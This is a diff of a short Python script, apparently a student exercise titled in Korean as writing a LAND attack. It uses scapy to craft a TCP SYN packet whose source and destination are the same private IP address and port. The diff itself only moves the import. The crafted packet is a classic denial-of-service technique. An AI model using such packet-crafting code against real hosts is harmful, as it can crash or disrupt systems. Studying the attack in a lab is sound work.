@@ -3,12 +3,13 @@
 #                                                 2020.12.15
 
 #                                           김 진 학 생 land 공 격 문 작 성
+from scapy.all import *
 
 if __name__ == '__main__':
     Total = 0
-    from scapy.all import *
+    
 
-    i = IP(src="172.30.1.4", dst="172.30.1.4")
+    i = IP(src="172.30.1.4", dst="172.30.1.4") 
     i.proto = 6
     tu = TCP()
     tu = TCP(dport=9001, sport=9001, flags=0x002)
